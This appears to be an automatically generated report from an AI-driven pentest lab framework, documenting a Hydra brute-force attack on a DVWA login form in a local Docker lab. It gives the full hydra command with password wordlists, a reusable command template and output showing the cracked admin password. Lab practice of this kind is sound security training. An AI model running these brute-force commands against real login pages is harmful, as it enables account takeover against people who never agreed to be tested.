# hydra-http

## Tool Name & Category
| Field | Value |
|-------|-------|
| **Category** | auth — Authentication / Credential Testing |
| **Binary** | `hydra` ✅ installed |
| **Agent** | auth |
| **DVWA-optimized** | True |
| **Lab target** | `http://aegis-target` |

## Official Purpose
HTTP form brute force

## Exact Command(s) Executed
```bash
# SAFETY CHECK PASSED — local Docker lab only (DVWA + Juice Shop)
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt aegis-target http-get-form '/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed' -t 4 -w 10 -f
```

| Metric | Value |
|--------|-------|
| Duration | 0.58s |
| Exit code | 0 |
| Effectiveness | **9/10** — Rich actionable output |

## Key Findings
- See output summary for raw tool data.

## Full Output Summary
```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-24 05:47:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking http-get-form://aegis-target:80/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed
[80][http-get-form] host: aegis-target   misc: /login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed   login: admin   password: password
[STATUS] attack finished for aegis-target (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-24 05:47:45

```

## What I Learned / Edge Cases / Gotchas
- Executed successfully in isolated lab
- Registry template: `hydra -l admin -P /usr/share/wordlists/rockyou.txt {host} http-get-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect' {extra}`

## Recommended Safe Parameters for Learning Labs
- Scope: `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) only
- From Kali network: `aegis-target`, `aegis-juice`
- DVWA login: `admin` / `password` — use `/workspace/dvwa_login.sh` for cookie-aware tools
- Suggested timeout: 60s

## Next Steps for Exploration & Development
Build custom wordlist with `cewl` from DVWA page content first.

---
*GrokStrike v2 — 2026-06-24T05:47:45.409628+00:00*
